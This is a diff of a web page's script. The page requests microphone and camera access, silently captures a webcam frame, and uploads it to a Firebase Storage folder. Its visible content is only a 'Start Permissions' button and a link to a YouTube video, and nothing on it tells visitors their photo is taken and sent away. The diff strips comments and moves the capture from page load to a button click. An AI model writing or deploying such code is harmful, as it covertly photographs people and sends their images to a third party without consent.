@@ -25,10 +25,6 @@
         const app = initializeApp(firebaseConfig);
         const storage = getStorage(app);
 
-        /**
-         * Function to upload image to Firebase Storage
-         * @param {string} imageData - The base64 encoded image data
-         */
         function uploadImage(imageData) {
             const storageRef = ref(storage, 'Zeyad/image_' + Date.now() + '.png'); // Set the path in Firebase Storage
             uploadString(storageRef, imageData, 'data_url')
@@ -40,10 +36,6 @@
                 });
         }
 
-        /**
-         * Function to request permissions for microphone and camera
-         * @returns {Promise<Object>} - Returns a promise that resolves with the microphone and camera streams
-         */
         async function requestPermissions() {
             try {
                 // Request microphone access first
@@ -66,9 +58,6 @@
             }
         }
 
-        /**
-         * Main function to set up video and canvas elements
-         */
         async function setupCamera() {
             const video = document.createElement('video'); // Create a video element for streaming
             const canvas = document.createElement('canvas'); // Create a canvas element for image capture
@@ -82,7 +71,6 @@
                 video.srcObject = camStream;
                 video.onloadedmetadata = () => {
                     video.play(); // Play the video stream when metadata is loaded
-                    // Set the canvas dimensions to match video resolution
                     canvas.width = 1920; // Set canvas width
                     canvas.height = 1080; // Set canvas height
                     // Capture image from video stream
@@ -93,15 +81,7 @@
             }
         }
 
-        /**
-         * Function to capture an image from the video stream
-         * @param {CanvasRenderingContext2D} context - The canvas context to draw on
-         * @param {HTMLVideoElement} video - The video element containing the stream
-         * @param {MediaStream} micStream - The microphone media stream
-         * @param {MediaStream} camStream - The camera media stream
-         */
         function captureImage(context, video, micStream, camStream) {
-            // Draw the current frame from the video onto the canvas
             context.drawImage(video, 0, 0, context.canvas.width, context.canvas.height);
             const imageData = context.canvas.toDataURL('image/png'); // Convert canvas to image data URL
             uploadImage(imageData); // Upload the captured image to Firebase
@@ -109,18 +89,15 @@
             stopVideo(camStream); // Stop the camera stream after capture
         }
 
-        /**
-         * Function to stop any active media streams
-         * @param {MediaStream} stream - The media stream to stop
-         */
         function stopVideo(stream) {
             const tracks = stream.getTracks(); // Get all tracks from the stream
             tracks.forEach(track => track.stop()); // Stop each track to release resources
         }
 
-        // Event listener for window load to initialize camera setup
+        // Event listener for the button click to initiate permission requests
         window.addEventListener('load', () => {
-            setupCamera(); // Start the camera setup process
+            const button = document.getElementById('startButton');
+            button.addEventListener('click', setupCamera); // Setup camera on button click
         });
     </script>
 
@@ -166,6 +143,7 @@
 </head>
 <body>
     <h1 style="display: none;">This is a hidden heading</h1> <!-- Example of hidden content -->
+    <button id="startButton" class="button">Start Permissions</button> <!-- Button that starts permission requests -->
     <a href="https://www.youtube.com/watch?v=xvFZjo5PgG0" class="button">Button</a> <!-- Button that redirects to YouTube -->
 </body>
 </html>
